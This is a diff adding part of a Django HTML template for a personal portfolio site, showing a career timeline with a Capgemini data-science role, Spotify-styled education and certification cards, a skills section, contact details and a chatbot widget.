+                                                    <h5>MLOps en Evolución (2020–2024)</h5>
+                                                    <ul>
+                                                        <li>2020: Pipelines iniciales en Azure ML Studio Classic</li>
+                                                        <li>2022: Transición a MLflow + Azure DevOps para CI/CD</li>
+                                                        <li>2023: Monitoreo con Application Insights + alertas personalizadas</li>
+                                                        <li>Automatización del 90% del reentrenamiento con Azure Functions v3</li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="tech-stack">
+                                                <h6>Tech Stack Principal:</h6>
+                                                <div class="tech-tags">
+                                                    <span class="tech-tag">Python</span>
+                                                    <span class="tech-tag">TensorFlow 2.4</span>
+                                                    <span class="tech-tag">BERT</span>
+                                                    <span class="tech-tag">OpenCV 4.2</span>
+                                                    <span class="tech-tag">Azure Databricks</span>
+                                                    <span class="tech-tag">Azure ML Studio</span>
+                                                    <span class="tech-tag">MLflow</span>
+                                                    <span class="tech-tag">Google OR-Tools</span>
+                                                    <span class="tech-tag">Azure IoT Hub</span>
+                                                    <span class="tech-tag">Power BI</span>
+                                                    <span class="tech-tag">Azure DevOps</span>
+                                                    <span class="tech-tag">Word2Vec</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Capgemini Experience - First Experience -->
+                            <div class="timeline-item" data-aos="fade-up" data-company="capgemini" id="timeline-capgemini">
+                                <div class="timeline-dot">
+                                    <div class="timeline-dot-inner"></div>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-company">
+                                        <div class="company-logo capgemini-logo">
+                                            <i class="fas fa-chart-bar"></i>
+                                        </div>
+                                        <div class="company-info">
+                                            <h3 class="position-title">Data Scientist - Junior</h3>
+                                            <h4 class="company-name">Capgemini</h4>
+                                            <div class="timeline-meta">
+                                                <span class="timeline-duration">
+                                                    <i class="fas fa-calendar-alt"></i>
+                                                    Jan. 2017 - Feb. 2020 · 3 years 2 months
+                                                </span>
+                                                <span class="timeline-location">
+                                                    <i class="fas fa-map-marker-alt"></i>
+                                                    Las Rozas de Madrid, Spain · Hybrid
+                                                </span>
+                                                <span class="timeline-type">
+                                                    <i class="fas fa-clock"></i>
+                                                    Full-time
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Duration Visualization -->
+                                    <div class="duration-visual">
+                                        <div class="duration-bar"> <!-- Auto width to fit content -->
+                                            <span class="duration-label">3 years 2 months - First job</span>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="timeline-description">
+                                        <p class="main-description">
+                                            💼 Collaboration on data analysis projects applied to product development, market trend identification and key insight visualization.
+                                        </p>
+                                        
+                                        <!-- Brief Summary - Always Visible -->
+                                        <div class="timeline-summary">
+                                            <div class="summary-highlights">
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">ETL</span>
+                                                    <span class="highlight-label">Repositorios</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">SQL</span>
+                                                    <span class="highlight-label">Bases de Datos</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">Tableau</span>
+                                                    <span class="highlight-label">Dashboards</span>
+                                                </div>
+                                                <div class="highlight-item">
+                                                    <span class="highlight-number">KPIs</span>
+                                                    <span class="highlight-label">Ejecutivos</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Expand/Collapse Button -->
+                                        <div class="timeline-expand-btn" onclick="toggleTimelineDetails('capgemini-details')">
+                                            <span class="expand-text">Ver detalles completos</span>
+                                            <i class="fas fa-chevron-down expand-icon"></i>
+                                        </div>
+                                        
+                                        <!-- Collapsible Details -->
+                                        <div class="timeline-details" id="capgemini-details">
+                                            <div class="achievements-grid">
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-database"></i>
+                                                    </div>
+                                                    <h5>Recolección e Integración de Datos</h5>
+                                                    <ul>
+                                                        <li>Construcción de repositorios de datos desde múltiples fuentes mediante procesos ETL eficientes</li>
+                                                        <li>Diseño de un repositorio centralizado de datos para análisis y exploración de tendencias del mercado</li>
+                                                        <li>Administración de bases de datos SQL para garantizar consultas eficientes</li>
+                                                        <li>Colaboración con equipos técnicos para optimización de estructuras de datos</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-brain"></i>
+                                                    </div>
+                                                    <h5>Análisis Avanzado y Modelado</h5>
+                                                    <ul>
+                                                        <li>Aplicación de modelos estadísticos y aprendizaje automático para identificar patrones</li>
+                                                        <li>Generación de insights accionables para orientar mejoras de producto centradas en el cliente</li>
+                                                        <li>Evaluación de datos históricos y actuales para detectar oportunidades emergentes</li>
+                                                        <li>Desarrollo de análisis predictivos usando scikit-learn y statsmodels</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-chart-line"></i>
+                                                    </div>
+                                                    <h5>Visualización & Dashboards</h5>
+                                                    <ul>
+                                                        <li>Diseño de dashboards interactivos en Tableau y Looker Studio</li>
+                                                        <li>Desarrollo de dashboards ejecutivos para comunicación de KPIs clave</li>
+                                                        <li>Facilitación de la toma de decisiones ejecutivas mediante visualizaciones claras</li>
+                                                        <li>Creación de informes analíticos para diversos stakeholders</li>
+                                                    </ul>
+                                                </div>
+                                                
+                                                <div class="achievement-card">
+                                                    <div class="achievement-icon">
+                                                        <i class="fas fa-file-alt"></i>
+                                                    </div>
+                                                    <h5>Gestión de Datos y Reporting</h5>
+                                                    <ul>
+                                                        <li>Creación de informes analíticos y documentación detallada</li>
+                                                        <li>Desarrollo de herramientas de análisis y reporting estratégico</li>
+                                                        <li>Análisis de tendencias para identificación de oportunidades de mercado</li>
+                                                        <li>Colaboración efectiva con equipos multidisciplinarios</li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="tech-stack">
+                                                <h6>Tech Stack Principal:</h6>
+                                                <div class="tech-tags">
+                                                    <span class="tech-tag">Python</span>
+                                                    <span class="tech-tag">R</span>
+                                                    <span class="tech-tag">SQL</span>
+                                                    <span class="tech-tag">Tableau</span>
+                                                    <span class="tech-tag">Looker Studio</span>
+                                                    <span class="tech-tag">pandas</span>
+                                                    <span class="tech-tag">numpy</span>
+                                                    <span class="tech-tag">scikit-learn</span>
+                                                    <span class="tech-tag">statsmodels</span>
+                                                    <span class="tech-tag">SQLAlchemy</span>
+                                                    <span class="tech-tag">Azure SQL</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Formación Académica Section - Authentic Spotify Style -->
+                <section id="estudios" class="section">
+                    <div class="spotify-section">
+                        <div class="spotify-header">
+                            <h2><i class="fas fa-graduation-cap icon"></i>Academic Background</h2>
+                            <p class="spotify-subtitle">Your educational journey</p>
+                        </div>
+                        
+                        <div class="spotify-grid">
+                            {% for study in studies %}
+                            <div class="spotify-card" data-study-id="{{ study.id }}">
+                                <div class="spotify-card-image">
+                                    <img src="{{ study.image_url }}" alt="{{ study.title }}" loading="lazy">
+                                    <div class="spotify-overlay">
+                                        <button class="spotify-play-btn" title="Ver detalles">
+                                            <i class="fas fa-play"></i>
+                                        </button>
+                                    </div>
+                                    <div class="spotify-gradient"></div>
+                                </div>
+                                
+                                <div class="spotify-card-content">
+                                    <h3 class="spotify-title">{{ study.title }}</h3>
+                                    <p class="spotify-artist">{{ study.institution }}</p>
+                                    <div class="spotify-meta">
+                                        <span class="spotify-year">{{ study.year_completed }}</span>
+                                        <span class="spotify-grade">{{ study.grade }}</span>
+                                    </div>
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                    
+                    <!-- Study Details Modal - Spotify Style -->
+                    <div class="spotify-modal" id="study-modal">
+                        <div class="spotify-modal-overlay" id="study-modal-overlay"></div>
+                        <div class="spotify-modal-content">
+                            <button class="spotify-modal-close" id="study-modal-close" title="Close" aria-label="Close study modal">
+                                <i class="fas fa-times"></i>
+                            </button>
+                            
+                            <div class="spotify-modal-header">
+                                <div class="spotify-modal-cover">
+                                    <img id="modal-study-image" src="" alt="">
+                                    <div class="spotify-modal-play">
+                                        <i class="fas fa-graduation-cap"></i>
+                                    </div>
+                                </div>
+                                
+                                <div class="spotify-modal-info">
+                                    <span class="spotify-modal-type">Estudio</span>
+                                    <h2 id="modal-study-title"></h2>
+                                    <p id="modal-study-institution" class="spotify-modal-artist"></p>
+                                    <p id="modal-study-description" class="spotify-modal-description"></p>
+                                    
+                                    <div class="spotify-modal-stats">
+                                        <div class="spotify-stat">
+                                            <span class="spotify-stat-label">Duración</span>
+                                            <span id="modal-study-duration" class="spotify-stat-value"></span>
+                                        </div>
+                                        <div class="spotify-stat">
+                                            <span class="spotify-stat-label">Calificación</span>
+                                            <span id="modal-study-grade" class="spotify-stat-value"></span>
+                                        </div>
+                                        <div class="spotify-stat">
+                                            <span class="spotify-stat-label">Especialización</span>
+                                            <span id="modal-study-specialization" class="spotify-stat-value"></span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="spotify-modal-skills">
+                                <h3>Competencias Adquiridas</h3>
+                                <div id="modal-study-skills" class="spotify-skills-list"></div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Certificaciones Section - Authentic Spotify Style -->
+                <section id="certificaciones" class="section">
+                    <div class="spotify-section">
+                        <div class="spotify-header">
+                            <h2><i class="fas fa-certificate icon"></i>Professional Certifications</h2>
+                            <p class="spotify-subtitle">Technical credentials and validations</p>
+                        </div>
+                        
+                        <div class="spotify-grid">
+                            {% for cert in portfolio.active_certifications %}
+                            <div class="spotify-card" data-cert-id="{{ cert.id }}">
+                                <div class="spotify-card-image">
+                                    {% if 'Azure' in cert.name %}
+                                    <div class="cert-image-placeholder microsoft-cert">
+                                        <i class="fab fa-microsoft"></i>
+                                        <span class="cert-type">Azure AI</span>
+                                    </div>
+                                    {% elif 'CISSP' in cert.name %}
+                                    <div class="cert-image-placeholder security-cert">
+                                        <i class="fas fa-shield-alt"></i>
+                                        <span class="cert-type">Security</span>
+                                    </div>
+                                    {% elif 'CEH' in cert.name %}
+                                    <div class="cert-image-placeholder hacker-cert">
+                                        <i class="fas fa-user-secret"></i>
+                                        <span class="cert-type">Ethical Hack</span>
+                                    </div>
+                                    {% elif 'TensorFlow' in cert.name %}
+                                    <div class="cert-image-placeholder ai-cert">
+                                        <i class="fab fa-google"></i>
+                                        <span class="cert-type">TensorFlow</span>
+                                    </div>
+                                    {% elif 'OSINT' in cert.name %}
+                                    <div class="cert-image-placeholder osint-cert">
+                                        <i class="fas fa-search"></i>
+                                        <span class="cert-type">OSINT</span>
+                                    </div>
+                                    {% elif 'Python' in cert.name %}
+                                    <div class="cert-image-placeholder python-cert">
+                                        <i class="fab fa-python"></i>
+                                        <span class="cert-type">Python</span>
+                                    </div>
+                                    {% else %}
+                                    <div class="cert-image-placeholder default-cert">
+                                        <i class="fas fa-certificate"></i>
+                                        <span class="cert-type">Certificate</span>
+                                    </div>
+                                    {% endif %}
+                                    
+                                    <div class="spotify-overlay">
+                                        <button class="spotify-play-btn" title="Ver detalles">
+                                            <i class="fas fa-play"></i>
+                                        </button>
+                                    </div>
+                                    <div class="spotify-gradient"></div>
+                                </div>
+                                
+                                <div class="spotify-card-content">
+                                    <h3 class="spotify-title">{{ cert.name }}</h3>
+                                    <p class="spotify-artist">{{ cert.issuer }}</p>
+                                    <div class="spotify-meta">
+                                        <span class="spotify-year">{{ cert.issue_date|date:"Y" }}</span>
+                                        {% if cert.is_valid %}
+                                        <span class="spotify-grade active">Activa</span>
+                                        {% else %}
+                                        <span class="spotify-grade expired">Expirada</span>
+                                        {% endif %}
+                                    </div>
+                                </div>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                    
+                    <!-- Certification Details Modal - Spotify Style -->
+                    <div class="spotify-modal" id="cert-modal">
+                        <div class="spotify-modal-overlay" id="cert-modal-overlay"></div>
+                        <div class="spotify-modal-content">
+                            <button class="spotify-modal-close" id="cert-modal-close" title="Close" aria-label="Close certification modal">
+                                <i class="fas fa-times"></i>
+                            </button>
+                            
+                            <div class="spotify-modal-header">
+                                <div class="spotify-modal-cover">
+                                    <div id="modal-cert-image" class="cert-modal-placeholder">
+                                        <i id="modal-cert-icon" class="fas fa-certificate"></i>
+                                        <span id="modal-cert-type" class="cert-type">Certificate</span>
+                                    </div>
+                                    <div class="spotify-modal-play">
+                                        <i class="fas fa-certificate"></i>
+                                    </div>
+                                </div>
+                                
+                                <div class="spotify-modal-info">
+                                    <span class="spotify-modal-type">Certificación</span>
+                                    <h2 id="modal-cert-title"></h2>
+                                    <p id="modal-cert-issuer" class="spotify-modal-artist"></p>
+                                    <p id="modal-cert-description" class="spotify-modal-description"></p>
+                                    
+                                    <div class="spotify-modal-stats">
+                                        <div class="spotify-stat">
+                                            <span class="spotify-stat-label">Emitida</span>
+                                            <span id="modal-cert-issued" class="spotify-stat-value"></span>
+                                        </div>
+                                        <div class="spotify-stat">
+                                            <span class="spotify-stat-label">Estado</span>
+                                            <span id="modal-cert-status" class="spotify-stat-value"></span>
+                                        </div>
+                                        <div class="spotify-stat">
+                                            <span class="spotify-stat-label">Validez</span>
+                                            <span id="modal-cert-validity" class="spotify-stat-value"></span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="spotify-modal-skills">
+                                <h3>Competencias Validadas</h3>
+                                <div id="modal-cert-skills" class="spotify-skills-list"></div>
+                                
+                                <div class="cert-modal-actions" id="cert-modal-actions">
+                                    <!-- Action buttons will be populated by JavaScript -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Skills Section - AI & ML Stack -->
+                <section id="skills" class="section">
+                    <h2><i class="fas fa-code icon"></i>AI & ML Stack</h2>
+                    <div class="skills-grid">
+                        {% for category, skills in skills_by_category.items %}
+                        <div class="skill-category" 
+                             data-theme="{% if '🔐' in category or 'Cybersecurity' in category or 'Pentesting' in category %}cyber{% else %}ai{% endif %}" 
+                             data-category="{{ category }}">
+                            <h3>{{ category }}</h3>
+                            <div class="skill-legend">
+                                {% for skill in skills %}
+                                <div class="skill-legend-item" data-skill="{{ skill.name }}">
+                                    <div class="skill-legend-color"></div>
+                                    <span class="skill-legend-text">{{ skill.name }}</span>
+                                    <span class="skill-legend-value">{{ skill.proficiency }}%</span>
+                                </div>
+                                {% endfor %}
+                            </div>
+                            <div class="skill-stats">
+                                <div class="skill-stat">
+                                    <span class="skill-stat-value">{{ skills|length }}</span>
+                                    <span class="skill-stat-label">Skills</span>
+                                </div>
+                                <div class="skill-stat">
+                                    <span class="skill-stat-value avg-level">
+                                        85%
+                                    </span>
+                                    <span class="skill-stat-label">Avg Level</span>
+                                </div>
+                            </div>
+                        </div>
+                        {% endfor %}
+                    </div>
+                </section>
+
+                <!-- Contact Section -->
+                <section id="contact" class="section">
+                    <h2><i class="fas fa-envelope icon"></i>Get In Touch</h2>
+                    <div class="text-center">
+                        <p class="mb-2">
+                            Interested in AI, Cybersecurity, or have a project in mind? Let's connect!
+                        </p>
+                        
+                        <div class="contact-info">
+                            <p><i class="fas fa-envelope"></i> <strong>Email:</strong> {{ personal_info.email }}</p>
+                            {% if personal_info.phone %}
+                            <p><i class="fas fa-phone"></i> <strong>Phone:</strong> {{ personal_info.phone }}</p>
+                            {% endif %}
+                            {% if personal_info.location %}
+                            <p><i class="fas fa-map-marker-alt"></i> <strong>Location:</strong> {{ personal_info.location }}</p>
+                            {% endif %}
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer>
+            <div class="container">
+                <div class="social-links">
+                    {% for key, social in social_links.items %}
+                    <a href="{{ social.url }}" target="_blank" title="{{ social.name }}">
+                        <i class="{{ social.icon }}"></i>
+                    </a>
+                    {% endfor %}
+                </div>
+                <p>&copy; 2024 {{ personal_info.name }}. All rights reserved.</p>
+                <p class="text-highlight">{{ personal_info.subtitle }}</p>
+            </div>
+        </footer>
+
+        <!-- Chatbot Floating Bubble -->
+        <div class="chatbot-bubble" id="chatbot-bubble">
+            <div class="chatbot-icon">
+                <i class="fas fa-robot"></i>
+            </div>
+            <div class="chatbot-pulse"></div>
+            <div class="chatbot-tooltip">
+                <span class="ai-text">AI Assistant</span>
+                <span class="cyber-text">Cyber Assistant</span>
+            </div>
+        </div>
+
+        <!-- Chatbot Window -->
+        <div class="chatbot-window" id="chatbot-window">
+            <div class="chatbot-header">
+                <div class="chatbot-header-info">
+                    <div class="chatbot-avatar">
+                        <i class="fas fa-robot"></i>
+                    </div>
+                    <div class="chatbot-title">
+                        <h4 class="ai-title">AI Assistant</h4>
+                        <h4 class="cyber-title">Cyber Assistant</h4>
+                        <span class="chatbot-status">Online</span>
+                    </div>
+                </div>
+                <div class="chatbot-controls">
+                    <button class="chatbot-maximize" id="chatbot-maximize" title="Maximize chatbot">
+                        <i class="fas fa-expand-alt"></i>
+                    </button>
+                    <button class="chatbot-close" id="chatbot-close" title="Close chatbot">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="chatbot-messages" id="chatbot-messages">
+                <!-- Messages will be populated by JavaScript -->
+            </div>
+            
+            <div class="chatbot-input-area">
+                <div class="chatbot-quick-actions">
+                    <button class="chat-quick-action" data-message="Tell me about Adrian's AI experience">
+                        <i class="fas fa-brain"></i>
+                        AI Experience
+                    </button>
+                    <button class="chat-quick-action" data-message="What cybersecurity skills does Adrian have?">
+                        <i class="fas fa-shield-alt"></i>
+                        Security Skills
+                    </button>
+                    <button class="chat-quick-action" data-message="Show me Adrian's latest projects">
+                        <i class="fas fa-code"></i>
+                        Latest Projects
+                    </button>
+                </div>
+                <div class="chatbot-input-wrapper">
+                    <textarea id="chatbot-input" placeholder="Ask me anything about Adrian's expertise..." rows="1"></textarea>
+                    <button class="chatbot-send" id="chatbot-send" title="Send message">
+                        <i class="fas fa-paper-plane"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    </div> <!-- End portfolio-content -->
+
+    <!-- CSRF Token for JavaScript -->
+    {% csrf_token %}
+    <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}">
+
+    <!-- Modular JavaScript -->
+    <script src="{% static 'js/effects.js' %}"></script>
+    <script src="{% static 'js/theme-switcher.js' %}"></script>
+    <script src="{% static 'js/sidebar-navigation.js' %}"></script>
+    <script src="{% static 'js/chatbot.js' %}"></script>
+</body>
+</html> 
